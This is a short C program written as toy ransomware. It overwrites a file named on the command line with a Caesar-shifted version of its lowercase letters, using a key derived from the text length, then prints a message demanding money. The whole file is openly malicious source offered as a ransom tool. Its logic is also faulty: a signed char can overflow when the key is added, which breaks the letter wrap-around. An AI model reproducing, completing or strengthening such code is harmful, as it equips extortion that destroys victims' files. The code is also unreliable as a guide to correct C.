#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int keygen(char * message) {
return ((strlen(message)*2 - 5) % 26);
}

void encrypt(char * message, int key) {
	for (int i = 0; message[i] != '\0'; i++) {
		if ((message[i] >= 'a') && (message[i] <= 'z')) {
            	message[i] = message[i] + key;
            	if (message[i] > 'z') {
               		message[i] = message[i] - 26;
               	}
               	}
         }
         	
}

void usage_message(char *programName) {
	printf("Usage: %s <fileName>\n", programName);
}

int main(int argc, char ** argv) {
    if (argc != 2) {
        	usage_message(argv[0]);
        	return 1;
    	}
    FILE* fptr;
    fptr = fopen(argv[1], "r+");

    if (fptr == NULL) {
        printf("Issue opening file. Check to see if your path or file name is correct.");
        return 2;
        }
    char buffer[1024];
    size_t bytesRead = fread(buffer, 1, sizeof(buffer) - 1, fptr);
    buffer[bytesRead] = '\0';

    int key = keygen(buffer);
    encrypt(buffer, key);

    rewind(fptr);
    fwrite(buffer, 1, strlen(buffer), fptr);
    fflush(fptr);
    fclose(fptr);
    printf("ALERT: Your important file has been RANSOMED. Send us money.");
    return 0;
}
